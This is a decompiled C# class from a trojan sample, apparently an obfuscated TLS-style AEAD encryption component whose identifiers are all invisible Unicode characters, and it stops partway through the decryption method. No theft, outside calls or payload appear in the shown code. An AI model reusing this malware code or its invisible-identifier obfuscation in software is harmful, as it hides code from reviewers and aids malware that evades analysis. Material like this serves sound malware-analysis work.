// Decompiled with JetBrains decompiler
// Type: ⁮‪⁪‭⁮‍⁭⁯‬​⁬⁬‏⁪‮⁮⁯⁭‏‬‫‍⁮‮⁭‬⁭‏‫‫⁯⁬⁯‏⁪‭‮⁪⁯⁬‮
// Assembly: ReadLineS0SAT, Version=2.0.8.1, Culture=neutral, PublicKeyToken=null
// MVID: 826822DE-6F21-4D67-9238-0DAF50EB618B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-9ec8f988ff41765b68c6a4d29d259fafb62e97ad2d3633c43fbe0ab0dd12518d.exe

using System;

public class \u206E‪⁪‭⁮‍⁭⁯‬​⁬⁬‏⁪‮⁮⁯⁭‏‬‫‍⁮‮⁭‬⁭‏‫‫⁯⁬⁯‏⁪‭‮⁪⁯⁬‮ : 
  \u206D‮⁯⁭‮‪‍‌‌‬⁫‌‌​‮⁫‭⁭‍⁮⁯‎⁬‪⁬‮⁭⁮​‫‪‌‪⁪‎‏‌‫‎⁬‮
{
  public const int \u200E‎‬‮‏⁯‭‫‬​⁪‫⁪‌⁯‏‬‌​⁬‬⁭⁬‎‮‍⁯‌‪⁭‪⁮⁪⁭⁪⁭⁬⁮⁮⁫‮ = 1;
  internal const int \u206C⁭‍‌‮⁮​⁯‭‬‪⁫⁮‬‏⁫⁫‏‌‬⁪⁯‎​‬‪‌‭⁮‎‌⁫‎⁫⁭⁬‮‪‮‬‮ = 2;
  protected readonly \u200B⁮‫‎‪‍⁬‍‎‪‫‎‭⁪⁪⁬‫⁬‍⁭‎‎⁯⁫​⁫‫⁯⁯​⁪⁯‫⁮‏⁯⁪⁮⁬‫‮ \u202A‮⁫‬‪⁮‌⁬‌⁪‫‌⁯‪‏‍⁮⁮⁫⁬⁯‌‮‎‪⁫‏‪‬⁭⁬⁪⁭‮‏⁭​⁯‍⁯‮;
  protected readonly int \u202D⁬‪‎​⁬‫‮⁫‫⁭‭‫‍‍‮‪⁭‭​​⁮‍‍⁬⁮​​⁪⁯‌⁫⁯‮⁮‍⁯⁮⁪‏‮;
  protected readonly int \u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮;
  protected readonly \u200D‬⁪‌‍‫‪‎‭⁭⁫‏‎‬‫‌⁯‍‎⁬‎‮‭​⁯‪⁭‌‬⁬⁭‬‍‌⁫⁪‪⁫‍‬‮ \u202D‍‍‍⁬⁫‭⁫‪⁪​‍‭‫‬​⁫‍⁫⁪‏⁪‍⁯⁮‬⁪‍⁮⁯⁬‌‍‮‮⁭⁯‏‎⁯‮;
  protected readonly \u200D‬⁪‌‍‫‪‎‭⁭⁫‏‎‬‫‌⁯‍‎⁬‎‮‭​⁯‪⁭‌‬⁬⁭‬‍‌⁫⁪‪⁫‍‬‮ \u206C‬‬‎​‎⁪‪‪‍⁮‭‎‍‫⁯⁯‪‏‎‪⁬‍​‬‬​⁪⁮‫‌‍‏‍⁪‭‭‏⁯‎‮;
  protected readonly byte[] \u202C‌⁬‪⁪⁫⁮⁬‏⁮‮⁫⁫‎⁭⁪⁫‪‍⁪​‎⁬‮⁫⁭‪⁮‎‏‮⁪‮‫‮‬⁬‭‏‪‮;
  protected readonly byte[] \u206E⁫‫‮⁪⁯‬‬⁯‬‎‭‭⁮‏‏​⁫‎‭‍‬‬‪⁯⁫⁮‮‌⁭‌⁬‪⁬‮⁬‫‎‪⁮‮;
  protected readonly int \u202E​​‪‫‎⁯‏‎‏‪‮⁭‌⁪​⁭‪‮⁮‎⁫‬‌⁯‪​‪‍‏‬‪‫‮‏⁮⁯‫‭⁮‮;

  public \u206E‪⁪‭⁮‍⁭⁯‬​⁬⁬‏⁪‮⁮⁯⁭‏‬‫‍⁮‮⁭‬⁭‏‫‫⁯⁬⁯‏⁪‭‮⁪⁯⁬‮(
    \u200B⁮‫‎‪‍⁬‍‎‪‫‎‭⁪⁪⁬‫⁬‍⁭‎‎⁯⁫​⁫‫⁯⁯​⁪⁯‫⁮‏⁯⁪⁮⁬‫‮ _param1,
    \u200D‬⁪‌‍‫‪‎‭⁭⁫‏‎‬‫‌⁯‍‎⁬‎‮‭​⁯‪⁭‌‬⁬⁭‬‍‌⁫⁪‪⁫‍‬‮ _param2,
    \u200D‬⁪‌‍‫‪‎‭⁭⁫‏‎‬‫‌⁯‍‎⁬‎‮‭​⁯‪⁭‌‬⁬⁭‬‍‌⁫⁪‪⁫‍‬‮ _param3,
    int _param4,
    int _param5)
    : this(_param1, _param2, _param3, _param4, _param5, 1)
  {
  }

  internal \u206E‪⁪‭⁮‍⁭⁯‬​⁬⁬‏⁪‮⁮⁯⁭‏‬‫‍⁮‮⁭‬⁭‏‫‫⁯⁬⁯‏⁪‭‮⁪⁯⁬‮(
    \u200B⁮‫‎‪‍⁬‍‎‪‫‎‭⁪⁪⁬‫⁬‍⁭‎‎⁯⁫​⁫‫⁯⁯​⁪⁯‫⁮‏⁯⁪⁮⁬‫‮ _param1,
    \u200D‬⁪‌‍‫‪‎‭⁭⁫‏‎‬‫‌⁯‍‎⁬‎‮‭​⁯‪⁭‌‬⁬⁭‬‍‌⁫⁪‪⁫‍‬‮ _param2,
    \u200D‬⁪‌‍‫‪‎‭⁭⁫‏‎‬‫‌⁯‍‎⁬‎‮‭​⁯‪⁭‌‬⁬⁭‬‍‌⁫⁪‪⁫‍‬‮ _param3,
    int _param4,
    int _param5,
    int _param6)
  {
    if (!\u206F⁮‮‫⁪⁯‮‫‫‌‮‏⁬⁫‎⁬‭‏⁪​‏‬‫‭‫⁫⁫‭‏‪⁮​⁪⁭⁭‭⁯⁯‫⁮‮.\u202C‮​‍‏‍⁭‭‭‎‮‌‮‏⁭⁫⁫⁮⁬⁮‏‌​‍‫⁬⁪⁪⁬‭‍⁪⁬​‪⁭‫⁫​⁫‮(_param1))
      throw new \u206B‌⁭⁭⁭⁯​⁪‭‍⁮‭⁪‍‏‌⁬‫⁯‫‫‬‎⁭⁫‎⁪‌‏⁫⁮‪‬‮‬‏‎‏⁮‪‮((byte) 80);
    this.\u202E​​‪‫‎⁯‏‎‏‪‮⁭‌⁪​⁭‪‮⁮‎⁫‬‌⁯‪​‪‍‏‬‪‫‮‏⁮⁯‫‭⁮‮ = _param6;
    int num1;
    if (_param6 != 1)
    {
      if (_param6 != 2)
        throw new \u206B‌⁭⁭⁭⁯​⁪‭‍⁮‭⁪‍‏‌⁬‫⁯‫‫‬‎⁭⁫‎⁪‌‏⁫⁮‪‬‮‬‏‎‏⁮‪‮((byte) 80);
      num1 = 12;
      this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮ = 0;
    }
    else
    {
      num1 = 4;
      this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮ = 8;
    }
    this.\u202A‮⁫‬‪⁮‌⁬‌⁪‫‌⁯‪‏‍⁮⁮⁫⁬⁯‌‮‎‪⁫‏‪‬⁭⁬⁪⁭‮‏⁭​⁯‍⁯‮ = _param1;
    this.\u202D⁬‪‎​⁬‫‮⁫‫⁭‭‫‍‍‮‪⁭‭​​⁮‍‍⁬⁮​​⁪⁯‌⁫⁯‮⁮‍⁯⁮⁪‏‮ = _param5;
    int num2 = 2 * _param4 + 2 * num1;
    byte[] numArray1 = \u206F⁮‮‫⁪⁯‮‫‫‌‮‏⁬⁫‎⁬‭‏⁪​‏‬‫‭‫⁫⁫‭‏‪⁮​⁪⁭⁭‭⁯⁯‫⁮‮.\u200B‌‪⁯‏‏​⁬⁯‭⁪‏‭‪⁭‮‏‌‮‮‬‌‭​​⁯‪‭‪⁮⁮⁫⁪‎⁫⁬‭‮‍‍‮(_param1, num2);
    int num3 = 0;
    \u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮ obj1 = new \u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮(numArray1, num3, _param4);
    int num4 = num3 + _param4;
    \u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮ obj2 = new \u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮(numArray1, num4, _param4);
    int num5 = num4 + _param4;
    byte[] numArray2 = \u206D‭‎‏⁪⁫‌⁫⁫‮‮​‮‫⁯‎​⁮‭‍⁬⁫⁭⁬‎⁭‫‮‫⁬⁫‬‮⁪‌⁮⁬⁭⁬‪‮.\u202D⁪‎⁭⁬​⁮⁪‮⁭‏⁯⁪‍⁭‍‭⁮‮⁮‍‮⁪⁮‭⁮‌​⁪‭‪‌‪‍‍‭⁫‎​⁬‮(numArray1, num5, num5 + num1);
    int num6 = num5 + num1;
    byte[] numArray3 = \u206D‭‎‏⁪⁫‌⁫⁫‮‮​‮‫⁯‎​⁮‭‍⁬⁫⁭⁬‎⁭‫‮‫⁬⁫‬‮⁪‌⁮⁬⁭⁬‪‮.\u202D⁪‎⁭⁬​⁮⁪‮⁭‏⁯⁪‍⁭‍‭⁮‮⁮‍‮⁪⁮‭⁮‌​⁪‭‪‌‪‍‍‭⁫‎​⁬‮(numArray1, num6, num6 + num1);
    if (num6 + num1 != num2)
      throw new \u206B‌⁭⁭⁭⁯​⁪‭‍⁮‭⁪‍‏‌⁬‫⁯‫‫‬‎⁭⁫‎⁪‌‏⁫⁮‪‬‮‬‏‎‏⁮‪‮((byte) 80);
    \u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮ obj3;
    \u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮ obj4;
    if (_param1.\u206A⁭⁫‫⁪‫​⁫‮⁯⁮⁫‫​⁭⁯⁬⁮​‭​‪‮‎⁮‫‌​‏‮‎‬⁫‮‪⁫‌⁮‬‬‮)
    {
      this.\u202D‍‍‍⁬⁫‭⁫‪⁪​‍‭‫‬​⁫‍⁫⁪‏⁪‍⁯⁮‬⁪‍⁮⁯⁬‌‍‮‮⁭⁯‏‎⁯‮ = _param3;
      this.\u206C‬‬‎​‎⁪‪‪‍⁮‭‎‍‫⁯⁯‪‏‎‪⁬‍​‬‬​⁪⁮‫‌‍‏‍⁪‭‭‏⁯‎‮ = _param2;
      this.\u202C‌⁬‪⁪⁫⁮⁬‏⁮‮⁫⁫‎⁭⁪⁫‪‍⁪​‎⁬‮⁫⁭‪⁮‎‏‮⁪‮‫‮‬⁬‭‏‪‮ = numArray3;
      this.\u206E⁫‫‮⁪⁯‬‬⁯‬‎‭‭⁮‏‏​⁫‎‭‍‬‬‪⁯⁫⁮‮‌⁭‌⁬‪⁬‮⁬‫‎‪⁮‮ = numArray2;
      obj3 = obj2;
      obj4 = obj1;
    }
    else
    {
      this.\u202D‍‍‍⁬⁫‭⁫‪⁪​‍‭‫‬​⁫‍⁫⁪‏⁪‍⁯⁮‬⁪‍⁮⁯⁬‌‍‮‮⁭⁯‏‎⁯‮ = _param2;
      this.\u206C‬‬‎​‎⁪‪‪‍⁮‭‎‍‫⁯⁯‪‏‎‪⁬‍​‬‬​⁪⁮‫‌‍‏‍⁪‭‭‏⁯‎‮ = _param3;
      this.\u202C‌⁬‪⁪⁫⁮⁬‏⁮‮⁫⁫‎⁭⁪⁫‪‍⁪​‎⁬‮⁫⁭‪⁮‎‏‮⁪‮‫‮‬⁬‭‏‪‮ = numArray2;
      this.\u206E⁫‫‮⁪⁯‬‬⁯‬‎‭‭⁮‏‏​⁫‎‭‍‬‬‪⁯⁫⁮‮‌⁭‌⁬‪⁬‮⁬‫‎‪⁮‮ = numArray3;
      obj3 = obj1;
      obj4 = obj2;
    }
    byte[] numArray4 = new byte[num1 + this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮];
    numArray4[0] = ~this.\u202C‌⁬‪⁪⁫⁮⁬‏⁮‮⁫⁫‎⁭⁪⁫‪‍⁪​‎⁬‮⁫⁭‪⁮‎‏‮⁪‮‫‮‬⁬‭‏‪‮[0];
    numArray4[1] = ~this.\u206E⁫‫‮⁪⁯‬‬⁯‬‎‭‭⁮‏‏​⁫‎‭‍‬‬‪⁯⁫⁮‮‌⁭‌⁬‪⁬‮⁬‫‎‪⁮‮[1];
    this.\u202D‍‍‍⁬⁫‭⁫‪⁪​‍‭‫‬​⁫‍⁫⁪‏⁪‍⁯⁮‬⁪‍⁮⁯⁬‌‍‮‮⁭⁯‏‎⁯‮.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(true, (\u202B⁭⁮‬‎⁪‬⁪‬⁮⁪‮‬‍‎⁮‎⁫‎​‌⁫⁪‭‬‮‏‮​⁮‌‌‬‌⁯‮⁫‮‬⁫‮) new \u200E⁪‏⁬‍‪⁬‌‪‭‪​‮‍‬⁬‬‪‌‭‭‌‌‍⁮⁪⁯⁫‍​‎‏⁪‮‌⁬⁯⁫⁯⁬‮(obj3, 8 * _param5, numArray4));
    this.\u206C‬‬‎​‎⁪‪‪‍⁮‭‎‍‫⁯⁯‪‏‎‪⁬‍​‬‬​⁪⁮‫‌‍‏‍⁪‭‭‏⁯‎‮.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(false, (\u202B⁭⁮‬‎⁪‬⁪‬⁮⁪‮‬‍‎⁮‎⁫‎​‌⁫⁪‭‬‮‏‮​⁮‌‌‬‌⁯‮⁫‮‬⁫‮) new \u200E⁪‏⁬‍‪⁬‌‪‭‪​‮‍‬⁬‬‪‌‭‭‌‌‍⁮⁪⁯⁫‍​‎‏⁪‮‌⁬⁯⁫⁯⁬‮(obj4, 8 * _param5, numArray4));
  }

  public virtual int \u206F‬⁭⁬‏⁪‏‪‏‌‬‪‬⁮‪⁭​‫‫‮⁪‪⁫‪‮‭⁯⁮‮‎‪‭⁯⁪⁫⁫‭‭‌⁪‮(int _param1) => _param1 - this.\u202D⁬‪‎​⁬‫‮⁫‫⁭‭‫‍‍‮‪⁭‭​​⁮‍‍⁬⁮​​⁪⁯‌⁫⁯‮⁮‍⁯⁮⁪‏‮ - this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮;

  public virtual byte[] \u202E‫‎‮‫‌⁮‎‎‫‎‌‫‭⁬​⁯‭‌‌⁪⁯⁭‎‎‎⁬​‭⁪⁬‫⁯⁭‎‏‫‮‭‫‮(
    long _param1,
    byte _param2,
    byte[] _param3,
    int _param4,
    int _param5)
  {
    byte[] numArray1 = new byte[this.\u202C‌⁬‪⁪⁫⁮⁬‏⁮‮⁫⁫‎⁭⁪⁫‪‍⁪​‎⁬‮⁫⁭‪⁮‎‏‮⁪‮‫‮‬⁬‭‏‪‮.Length + this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮];
    switch (this.\u202E​​‪‫‎⁯‏‎‏‪‮⁭‌⁪​⁭‪‮⁮‎⁫‬‌⁯‪​‪‍‏‬‪‫‮‏⁮⁯‫‭⁮‮)
    {
      case 1:
        Array.Copy((Array) this.\u202C‌⁬‪⁪⁫⁮⁬‏⁮‮⁫⁫‎⁭⁪⁫‪‍⁪​‎⁬‮⁫⁭‪⁮‎‏‮⁪‮‫‮‬⁬‭‏‪‮, 0, (Array) numArray1, 0, this.\u202C‌⁬‪⁪⁫⁮⁬‏⁮‮⁫⁫‎⁭⁪⁫‪‍⁪​‎⁬‮⁫⁭‪⁮‎‏‮⁪‮‫‮‬⁬‭‏‪‮.Length);
        \u206F⁮‮‫⁪⁯‮‫‫‌‮‏⁬⁫‎⁬‭‏⁪​‏‬‫‭‫⁫⁫‭‏‪⁮​⁪⁭⁭‭⁯⁯‫⁮‮.\u200F⁪⁮‏‮‬‪‮‏⁭⁯‏‍‎⁮‫‏‪‭‌‌‪⁯‭⁪⁭⁪​‎‌‏‮‌‏‫​⁬‮⁮‍‮(_param1, numArray1, this.\u202C‌⁬‪⁪⁫⁮⁬‏⁮‮⁫⁫‎⁭⁪⁫‪‍⁪​‎⁬‮⁫⁭‪⁮‎‏‮⁪‮‫‮‬⁬‭‏‪‮.Length);
        break;
      case 2:
        \u206F⁮‮‫⁪⁯‮‫‫‌‮‏⁬⁫‎⁬‭‏⁪​‏‬‫‭‫⁫⁫‭‏‪⁮​⁪⁭⁭‭⁯⁯‫⁮‮.\u200F⁪⁮‏‮‬‪‮‏⁭⁯‏‍‎⁮‫‏‪‭‌‌‪⁯‭⁪⁭⁪​‎‌‏‮‌‏‫​⁬‮⁮‍‮(_param1, numArray1, numArray1.Length - 8);
        for (int index = 0; index < this.\u202C‌⁬‪⁪⁫⁮⁬‏⁮‮⁫⁫‎⁭⁪⁫‪‍⁪​‎⁬‮⁫⁭‪⁮‎‏‮⁪‮‫‮‬⁬‭‏‪‮.Length; ++index)
          numArray1[index] ^= this.\u202C‌⁬‪⁪⁫⁮⁬‏⁮‮⁫⁫‎⁭⁪⁫‪‍⁪​‎⁬‮⁫⁭‪⁮‎‏‮⁪‮‫‮‬⁬‭‏‪‮[index];
        break;
      default:
        throw new \u206B‌⁭⁭⁭⁯​⁪‭‍⁮‭⁪‍‏‌⁬‫⁯‫‫‬‎⁭⁫‎⁪‌‏⁫⁮‪‬‮‬‏‎‏⁮‪‮((byte) 80);
    }
    int num1 = _param4;
    int num2 = _param5;
    byte[] destinationArray = new byte[this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮ + this.\u202D‍‍‍⁬⁫‭⁫‪⁪​‍‭‫‬​⁫‍⁫⁪‏⁪‍⁯⁮‬⁪‍⁮⁯⁬‌‍‮‮⁭⁯‏‎⁯‮.\u200E‍‮‎‎‎​‫⁫‍‮‭‫⁬⁭⁪​‮⁭‫⁫‌⁫⁯‮‪⁪‭⁭‬‎​⁪‎‪‫⁯‭‌⁫‮(num2)];
    if (this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮ != 0)
      Array.Copy((Array) numArray1, numArray1.Length - this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮, (Array) destinationArray, 0, this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮);
    int num3 = this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮;
    byte[] numArray2 = this.\u200C‏‎⁮⁪⁭‮⁭⁪‍‎‏‎‮‎⁮‭‌‎‬⁮​⁯‮‪⁫‎‬⁮‫⁬‌⁫‫⁪⁮‎‏‌‭‮(_param1, _param2, num2);
    \u200E⁪‏⁬‍‪⁬‌‪‭‪​‮‍‬⁬‬‪‌‭‭‌‌‍⁮⁪⁯⁫‍​‎‏⁪‮‌⁬⁯⁫⁯⁬‮ obj = new \u200E⁪‏⁬‍‪⁬‌‪‭‪​‮‍‬⁬‬‪‌‭‭‌‌‍⁮⁪⁯⁫‍​‎‏⁪‮‌⁬⁯⁫⁯⁬‮((\u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮) null, 8 * this.\u202D⁬‪‎​⁬‫‮⁫‫⁭‭‫‍‍‮‪⁭‭​​⁮‍‍⁬⁮​​⁪⁯‌⁫⁯‮⁮‍⁯⁮⁪‏‮, numArray1, numArray2);
    int num4;
    try
    {
      this.\u202D‍‍‍⁬⁫‭⁫‪⁪​‍‭‫‬​⁫‍⁫⁪‏⁪‍⁯⁮‬⁪‍⁮⁯⁬‌‍‮‮⁭⁯‏‎⁯‮.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(true, (\u202B⁭⁮‬‎⁪‬⁪‬⁮⁪‮‬‍‎⁮‎⁫‎​‌⁫⁪‭‬‮‏‮​⁮‌‌‬‌⁯‮⁫‮‬⁫‮) obj);
      int num5 = num3 + this.\u202D‍‍‍⁬⁫‭⁫‪⁪​‍‭‫‬​⁫‍⁫⁪‏⁪‍⁯⁮‬⁪‍⁮⁯⁬‌‍‮‮⁭⁯‏‎⁯‮.\u206D‫⁭‪‭‏‎‌⁪⁪⁯‪​‌⁯‪‮⁮⁭‎⁪​⁯⁮‪‬‮⁪‭‬‍‫⁪⁭‍⁪‏⁪⁬‪‮(_param3, num1, num2, destinationArray, num3);
      num4 = num5 + this.\u202D‍‍‍⁬⁫‭⁫‪⁪​‍‭‫‬​⁫‍⁫⁪‏⁪‍⁯⁮‬⁪‍⁮⁯⁬‌‍‮‮⁭⁯‏‎⁯‮.\u200F‏‏‬‫​⁮‬⁫‌‌⁮⁬‏⁭‭‌⁯⁪​‍​⁮⁫‮‫⁮‌‎‪⁬⁯⁪‪⁬‫⁫⁮‪⁭‮(destinationArray, num5);
    }
    catch (Exception ex)
    {
      throw new \u206B‌⁭⁭⁭⁯​⁪‭‍⁮‭⁪‍‏‌⁬‫⁯‫‫‬‎⁭⁫‎⁪‌‏⁫⁮‪‬‮‬‏‎‏⁮‪‮((byte) 80, ex);
    }
    if (num4 != destinationArray.Length)
      throw new \u206B‌⁭⁭⁭⁯​⁪‭‍⁮‭⁪‍‏‌⁬‫⁯‫‫‬‎⁭⁫‎⁪‌‏⁫⁮‪‬‮‬‏‎‏⁮‪‮((byte) 80);
    return destinationArray;
  }

  public virtual byte[] \u206D⁫⁬⁪​⁪‏‌⁭‫‮‍‏⁫⁭⁬‪⁬⁮⁯⁬⁪‬‭⁭‬⁬‮‪⁫‮‏⁫‮⁭‬‎⁯‎‪‮(
    long _param1,
    byte _param2,
    byte[] _param3,
    int _param4,
    int _param5)
  {
    if (this.\u206F‬⁭⁬‏⁪‏‪‏‌‬‪‬⁮‪⁭​‫‫‮⁪‪⁫‪‮‭⁯⁮‮‎‪‭⁯⁪⁫⁫‭‭‌⁪‮(_param5) < 0)
      throw new \u206B‌⁭⁭⁭⁯​⁪‭‍⁮‭⁪‍‏‌⁬‫⁯‫‫‬‎⁭⁫‎⁪‌‏⁫⁮‪‬‮‬‏‎‏⁮‪‮((byte) 50);
    byte[] destinationArray = new byte[this.\u206E⁫‫‮⁪⁯‬‬⁯‬‎‭‭⁮‏‏​⁫‎‭‍‬‬‪⁯⁫⁮‮‌⁭‌⁬‪⁬‮⁬‫‎‪⁮‮.Length + this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮];
    switch (this.\u202E​​‪‫‎⁯‏‎‏‪‮⁭‌⁪​⁭‪‮⁮‎⁫‬‌⁯‪​‪‍‏‬‪‫‮‏⁮⁯‫‭⁮‮)
    {
      case 1:
        Array.Copy((Array) this.\u206E⁫‫‮⁪⁯‬‬⁯‬‎‭‭⁮‏‏​⁫‎‭‍‬‬‪⁯⁫⁮‮‌⁭‌⁬‪⁬‮⁬‫‎‪⁮‮, 0, (Array) destinationArray, 0, this.\u206E⁫‫‮⁪⁯‬‬⁯‬‎‭‭⁮‏‏​⁫‎‭‍‬‬‪⁯⁫⁮‮‌⁭‌⁬‪⁬‮⁬‫‎‪⁮‮.Length);
        Array.Copy((Array) _param3, _param4, (Array) destinationArray, destinationArray.Length - this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮, this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮);
        break;
      case 2:
        \u206F⁮‮‫⁪⁯‮‫‫‌‮‏⁬⁫‎⁬‭‏⁪​‏‬‫‭‫⁫⁫‭‏‪⁮​⁪⁭⁭‭⁯⁯‫⁮‮.\u200F⁪⁮‏‮‬‪‮‏⁭⁯‏‍‎⁮‫‏‪‭‌‌‪⁯‭⁪⁭⁪​‎‌‏‮‌‏‫​⁬‮⁮‍‮(_param1, destinationArray, destinationArray.Length - 8);
        for (int index = 0; index < this.\u206E⁫‫‮⁪⁯‬‬⁯‬‎‭‭⁮‏‏​⁫‎‭‍‬‬‪⁯⁫⁮‮‌⁭‌⁬‪⁬‮⁬‫‎‪⁮‮.Length; ++index)
          destinationArray[index] ^= this.\u206E⁫‫‮⁪⁯‬‬⁯‬‎‭‭⁮‏‏​⁫‎‭‍‬‬‪⁯⁫⁮‮‌⁭‌⁬‪⁬‮⁬‫‎‪⁮‮[index];
        break;
      default:
        throw new \u206B‌⁭⁭⁭⁯​⁪‭‍⁮‭⁪‍‏‌⁬‫⁯‫‫‬‎⁭⁫‎⁪‌‏⁫⁮‪‬‮‬‏‎‏⁮‪‮((byte) 80);
    }
    int num1 = _param4 + this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮;
    int num2 = _param5 - this.\u200C‭‌‍‌‏‬⁪⁮​‌​‍‪⁫‌⁫‭‮​‎‫‫⁫⁪⁮⁪‌‍‭‭‮⁬‍⁫‫‫⁮‌‪‮;
    int length = this.\u206C‬‬‎​‎⁪‪‪‍⁮‭‎‍‫⁯⁯‪‏‎‪⁬‍​‬‬​⁪⁮‫‌‍‏‍⁪‭‭‏⁯‎‮.\u200E‍‮‎‎‎​‫⁫‍‮‭‫⁬⁭⁪​‮⁭‫⁫‌⁫⁯‮‪⁪‭⁭‬‎​⁪‎‪‫⁯‭‌⁫‮(num2);
    byte[] numArray1 = new byte[length];
    int num3 = 0;
    byte[] numArray2 = this.\u200C‏‎⁮⁪⁭‮⁭⁪‍‎‏‎‮‎⁮‭‌‎‬⁮​⁯‮‪⁫‎‬⁮‫⁬‌⁫‫⁪⁮‎‏‌‭‮(_param1, _param2, length);
    \u200E⁪‏⁬‍‪⁬‌‪‭‪​‮‍‬⁬‬‪‌‭‭‌‌‍⁮⁪⁯⁫‍​‎‏⁪‮‌⁬⁯⁫⁯⁬‮ obj = new \u200E⁪‏⁬‍‪⁬‌‪‭‪​‮‍‬⁬‬‪‌‭‭‌‌‍⁮⁪⁯⁫‍​‎‏⁪‮‌⁬⁯⁫⁯⁬‮((\u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮) null, 8 * this.\u202D⁬‪‎​⁬‫‮⁫‫⁭‭‫‍‍‮‪⁭‭​​⁮‍‍⁬⁮​​⁪⁯‌⁫⁯‮⁮‍⁯⁮⁪‏‮, destinationArray, numArray2);
    int num4;
    try
    {
      this.\u206C‬‬‎​‎⁪‪‪‍⁮‭‎‍‫⁯⁯‪‏‎‪⁬‍​‬‬​⁪⁮‫‌‍‏‍⁪‭‭‏⁯‎‮.\u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(false, (\u202B⁭⁮‬‎⁪‬⁪‬⁮⁪‮‬‍‎⁮‎⁫‎​‌⁫⁪‭‬‮‏‮​⁮‌‌‬‌⁯‮⁫‮‬⁫‮) obj);
